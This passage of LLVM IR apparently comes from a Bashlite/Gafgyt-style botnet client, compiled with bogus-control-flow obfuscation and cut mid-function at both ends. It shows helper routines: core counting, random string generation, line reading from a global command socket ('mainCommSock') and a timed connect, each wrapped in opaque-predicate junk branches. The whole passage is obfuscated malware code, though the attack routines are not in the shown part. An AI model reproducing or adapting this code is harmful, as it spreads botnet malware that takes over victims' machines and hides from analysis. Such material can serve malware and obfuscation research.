  %111 = call i8* @strchr(i8* %110, i32 46) #10
  %112 = icmp ne i8* %111, null
  %113 = load i32, i32* @x.33
  %114 = load i32, i32* @y.34
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %112, label %121, label %140

; <label>:121:                                    ; preds = %originalBBpart28
  %122 = load i32, i32* @x.33
  %123 = load i32, i32* @y.34
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %121
  %130 = load i8*, i8** %14, align 8
  %131 = call i8* @strchr(i8* %130, i32 46) #10
  store i8 0, i8* %131, align 1
  %132 = load i32, i32* @x.33
  %133 = load i32, i32* @y.34
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %140

; <label>:140:                                    ; preds = %originalBBpart212, %originalBBpart28
  %141 = load i8*, i8** %11, align 8
  %142 = load i8*, i8** %14, align 8
  %143 = call i8* @strcpy(i8* %141, i8* %142) #2
  %144 = load i32, i32* %12, align 4
  %145 = call i32 @close(i32 %144)
  store i32 0, i32* %10, align 4
  br label %167

; <label>:146:                                    ; preds = %29
  %147 = getelementptr inbounds [4096 x i8], [4096 x i8]* %13, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %147, i8 0, i64 4096, i32 16, i1 false)
  br label %24

; <label>:148:                                    ; preds = %24
  %149 = load i32, i32* @x.33
  %150 = load i32, i32* @y.34
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %148
  %157 = load i32, i32* %12, align 4
  %158 = call i32 @close(i32 %157)
  store i32 1, i32* %10, align 4
  %159 = load i32, i32* @x.33
  %160 = load i32, i32* @y.34
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %167

; <label>:167:                                    ; preds = %originalBBpart216, %140
  %168 = load i32, i32* %10, align 4
  ret i32 %168

originalBBalteredBB:                              ; preds = %originalBB, %1
  %169 = alloca i32, align 4
  %170 = alloca i8*, align 8
  %171 = alloca i32, align 4
  %172 = alloca [4096 x i8], align 16
  %173 = alloca i8*, align 8
  store i8* %0, i8** %170, align 8
  %174 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %174, i32* %171, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %68
  %175 = load i8*, i8** %14, align 8
  %176 = load i8*, i8** %14, align 8
  %177 = call i64 @strlen(i8* %176) #10
  %_ = shl i64 %177, 1
  %_2 = shl i64 %177, 1
  %178 = sub i64 %177, 1
  %179 = getelementptr inbounds i8, i8* %175, i64 %178
  %180 = load i8, i8* %179, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 10
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %101
  %183 = load i8*, i8** %14, align 8
  %184 = call i8* @strchr(i8* %183, i32 46) #10
  %185 = icmp ne i8* %184, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %121
  %186 = load i8*, i8** %14, align 8
  %187 = call i8* @strchr(i8* %186, i32 46) #10
  store i8 0, i8* %187, align 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %148
  %188 = load i32, i32* %12, align 4
  %189 = call i32 @close(i32 %188)
  store i32 1, i32* %10, align 4
  br label %originalBB14
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  br label %5

; <label>:5:                                      ; preds = %35, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %37

; <label>:10:                                     ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %13 = call i8* @strstr(i8* %12, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i32 0, i32 0)) #10
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %35

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @x.35
  %18 = load i32, i32* @y.36
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load i32, i32* %1, align 4
  %26 = add nsw i32 %25, 1
  store i32 %26, i32* %1, align 4
  %27 = load i32, i32* @x.35
  %28 = load i32, i32* @y.36
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %35

; <label>:35:                                     ; preds = %originalBBpart2, %10
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %36, i8 0, i64 4096, i32 16, i1 false)
  br label %5

; <label>:37:                                     ; preds = %5
  %38 = load i32, i32* %2, align 4
  %39 = call i32 @close(i32 %38)
  %40 = load i32, i32* %1, align 4
  ret i32 %40

originalBBalteredBB:                              ; preds = %originalBB, %16
  %41 = load i32, i32* %1, align 4
  %_ = sub i32 %41, 1
  %gen = mul i32 %_, 1
  %_1 = sub i32 %41, 1
  %gen2 = mul i32 %_1, 1
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %1, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %35, %2
  %7 = load i32, i32* @x.37
  %8 = load i32, i32* @y.38
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %5, align 4
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %15, %16
  %18 = load i32, i32* @x.37
  %19 = load i32, i32* @y.38
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %17, label %26, label %38

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = call i32 @rand_cmwc()
  %28 = urem i32 %27, 26
  %29 = add i32 %28, 65
  %30 = trunc i32 %29 to i8
  %31 = load i8*, i8** %3, align 8
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  store i8 %30, i8* %34, align 1
  br label %35

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* %5, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %5, align 4
  br label %6

; <label>:38:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %39 = load i32, i32* %5, align 4
  %40 = load i32, i32* %4, align 4
  %41 = icmp slt i32 %39, %40
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %152

; <label>:49:                                     ; preds = %33
  %50 = load i32, i32* @x.39
  %51 = load i32, i32* @y.40
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %49
  %58 = load i32, i32* @x.39
  %59 = load i32, i32* @y.40
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %66

; <label>:66:                                     ; preds = %131, %originalBBpart2
  %67 = load i32, i32* %13, align 4
  %68 = icmp slt i32 %67, 10
  br i1 %68, label %69, label %135

; <label>:69:                                     ; preds = %66
  %70 = load i32, i32* @x.39
  %71 = load i32, i32* @y.40
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %69
  %78 = load i32, i32* @mainCommSock, align 4
  %79 = call i32 (i32, i8*, ...) @sockprintf(i32 %78, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0))
  %80 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %80, align 8
  %81 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %81, align 8
  %82 = load i32, i32* @x.39
  %83 = load i32, i32* @y.40
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %90

; <label>:90:                                     ; preds = %originalBBpart24
  %91 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %92 = getelementptr inbounds [16 x i64], [16 x i64]* %91, i64 0, i64 0
  %93 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %92) #2, !srcloc !2
  %94 = extractvalue { i64, i64* } %93, 0
  %95 = extractvalue { i64, i64* } %93, 1
  %96 = trunc i64 %94 to i32
  store i32 %96, i32* %14, align 4
  %97 = ptrtoint i64* %95 to i64
  %98 = trunc i64 %97 to i32
  store i32 %98, i32* %15, align 4
  br label %99

; <label>:99:                                     ; preds = %90
  %100 = load i32, i32* @x.39
  %101 = load i32, i32* @y.40
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %99
  %108 = load i32, i32* %5, align 4
  %109 = srem i32 %108, 64
  %110 = zext i32 %109 to i64
  %111 = shl i64 1, %110
  %112 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %113 = load i32, i32* %5, align 4
  %114 = sdiv i32 %113, 64
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds [16 x i64], [16 x i64]* %112, i64 0, i64 %115
  %117 = load i64, i64* %116, align 8
  %118 = or i64 %117, %111
  store i64 %118, i64* %116, align 8
  %119 = load i32, i32* %5, align 4
  %120 = add nsw i32 %119, 1
  %121 = call i32 @select(i32 %120, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %121, i32* %12, align 4
  %122 = icmp sle i32 %121, 0
  %123 = load i32, i32* @x.39
  %124 = load i32, i32* @y.40
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart240, label %originalBB6alteredBB

originalBBpart240:                                ; preds = %originalBB6
  br i1 %122, label %131, label %134

; <label>:131:                                    ; preds = %originalBBpart240
  %132 = load i32, i32* %13, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %13, align 4
  br label %66

; <label>:134:                                    ; preds = %originalBBpart240
  br label %135

; <label>:135:                                    ; preds = %134, %66
  %136 = load i32, i32* @x.39
  %137 = load i32, i32* @y.40
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %135
  %144 = load i32, i32* @x.39
  %145 = load i32, i32* @y.40
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %152

; <label>:152:                                    ; preds = %originalBBpart244, %33
  store i32 0, i32* %18, align 4
  %153 = load i8*, i8** %6, align 8
  store i8* %153, i8** %17, align 8
  br label %154

; <label>:154:                                    ; preds = %220, %152
  %155 = load i32, i32* @x.39
  %156 = load i32, i32* @y.40
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %154
  %163 = load i32, i32* %7, align 4
  %164 = add nsw i32 %163, -1
  store i32 %164, i32* %7, align 4
  %165 = icmp sgt i32 %163, 1
  %166 = load i32, i32* @x.39
  %167 = load i32, i32* @y.40
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart253, label %originalBB46alteredBB

originalBBpart253:                                ; preds = %originalBB46
  br i1 %165, label %174, label %223

; <label>:174:                                    ; preds = %originalBBpart253
  %175 = load i32, i32* @x.39
  %176 = load i32, i32* @y.40
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %174
  %183 = load i32, i32* @mainCommSock, align 4
  %184 = call i64 @recv(i32 %183, i8* %16, i64 1, i32 0)
  %185 = icmp ne i64 %184, 1
  %186 = load i32, i32* @x.39
  %187 = load i32, i32* @y.40
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br i1 %185, label %194, label %196

; <label>:194:                                    ; preds = %originalBBpart257
  %195 = load i8*, i8** %17, align 8
  store i8 0, i8* %195, align 1
  store i32 -1, i32* %4, align 4
  br label %242

; <label>:196:                                    ; preds = %originalBBpart257
  %197 = load i32, i32* @x.39
  %198 = load i32, i32* @y.40
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %196
  %205 = load i8, i8* %16, align 1
  %206 = load i8*, i8** %17, align 8
  %207 = getelementptr inbounds i8, i8* %206, i32 1
  store i8* %207, i8** %17, align 8
  store i8 %205, i8* %206, align 1
  %208 = load i8, i8* %16, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 10
  %211 = load i32, i32* @x.39
  %212 = load i32, i32* @y.40
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br i1 %210, label %219, label %220

; <label>:219:                                    ; preds = %originalBBpart261
  br label %223

; <label>:220:                                    ; preds = %originalBBpart261
  %221 = load i32, i32* %18, align 4
  %222 = add nsw i32 %221, 1
  store i32 %222, i32* %18, align 4
  br label %154

; <label>:223:                                    ; preds = %219, %originalBBpart253
  %224 = load i32, i32* @x.39
  %225 = load i32, i32* @y.40
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %223
  %232 = load i8*, i8** %17, align 8
  store i8 0, i8* %232, align 1
  %233 = load i32, i32* %18, align 4
  store i32 %233, i32* %4, align 4
  %234 = load i32, i32* @x.39
  %235 = load i32, i32* @y.40
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %242

; <label>:242:                                    ; preds = %originalBBpart265, %194
  %243 = load i32, i32* @x.39
  %244 = load i32, i32* @y.40
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %242
  %251 = load i32, i32* %4, align 4
  %252 = load i32, i32* @x.39
  %253 = load i32, i32* @y.40
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  ret i32 %251

originalBBalteredBB:                              ; preds = %originalBB, %49
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %69
  %260 = load i32, i32* @mainCommSock, align 4
  %261 = call i32 (i32, i8*, ...) @sockprintf(i32 %260, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0))
  %262 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %262, align 8
  %263 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %263, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %99
  %264 = load i32, i32* %5, align 4
  %_ = shl i32 %264, 64
  %_7 = shl i32 %264, 64
  %_8 = shl i32 %264, 64
  %_9 = shl i32 %264, 64
  %_10 = sub i32 %264, 64
  %gen = mul i32 %_10, 64
  %_11 = shl i32 %264, 64
  %_12 = shl i32 %264, 64
  %265 = srem i32 %264, 64
  %266 = zext i32 %265 to i64
  %_13 = sub i64 1, %266
  %gen14 = mul i64 %_13, %266
  %_15 = sub i64 1, %266
  %gen16 = mul i64 %_15, %266
  %_17 = sub i64 1, %266
  %gen18 = mul i64 %_17, %266
  %_19 = shl i64 1, %266
  %267 = shl i64 1, %266
  %268 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %269 = load i32, i32* %5, align 4
  %_20 = sub i32 %269, 64
  %gen21 = mul i32 %_20, 64
  %_22 = shl i32 %269, 64
  %_23 = shl i32 %269, 64
  %270 = sdiv i32 %269, 64
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds [16 x i64], [16 x i64]* %268, i64 0, i64 %271
  %273 = load i64, i64* %272, align 8
  %_24 = sub i64 0, %273
  %gen25 = add i64 %_24, %267
  %_26 = shl i64 %273, %267
  %_27 = sub i64 %273, %267
  %gen28 = mul i64 %_27, %267
  %_29 = sub i64 %273, %267
  %gen30 = mul i64 %_29, %267
  %_31 = shl i64 %273, %267
  %_32 = sub i64 0, %273
  %gen33 = add i64 %_32, %267
  %_34 = sub i64 0, %273
  %gen35 = add i64 %_34, %267
  %_36 = shl i64 %273, %267
  %274 = or i64 %273, %267
  store i64 %274, i64* %272, align 8
  %275 = load i32, i32* %5, align 4
  %_37 = sub i32 0, %275
  %gen38 = add i32 %_37, 1
  %276 = add nsw i32 %275, 1
  %277 = call i32 @select(i32 %276, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %277, i32* %12, align 4
  %278 = icmp sle i32 %277, 0
  br label %originalBB6

originalBB42alteredBB:                            ; preds = %originalBB42, %135
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %154
  %279 = load i32, i32* %7, align 4
  %_47 = sub i32 0, %279
  %gen48 = add i32 %_47, -1
  %_49 = shl i32 %279, -1
  %_50 = shl i32 %279, -1
  %_51 = shl i32 %279, -1
  %280 = add nsw i32 %279, -1
  store i32 %280, i32* %7, align 4
  %281 = icmp sgt i32 %279, 1
  br label %originalBB46

originalBB55alteredBB:                            ; preds = %originalBB55, %174
  %282 = load i32, i32* @mainCommSock, align 4
  %283 = call i64 @recv(i32 %282, i8* %16, i64 1, i32 0)
  %284 = icmp ne i64 %283, 1
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %196
  %285 = load i8, i8* %16, align 1
  %286 = load i8*, i8** %17, align 8
  %287 = getelementptr inbounds i8, i8* %286, i32 1
  store i8* %287, i8** %17, align 8
  store i8 %285, i8* %286, align 1
  %288 = load i8, i8* %16, align 1
  %289 = zext i8 %288 to i32
  %290 = icmp eq i32 %289, 10
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %223
  %291 = load i8*, i8** %17, align 8
  store i8 0, i8* %291, align 1
  %292 = load i32, i32* %18, align 4
  store i32 %292, i32* %4, align 4
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %242
  %293 = load i32, i32* %4, align 4
  br label %originalBB67
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %53

; <label>:36:                                     ; preds = %4
  %37 = load i32, i32* @x.41
  %38 = load i32, i32* @y.42
  %39 = sub i32 %37, 1
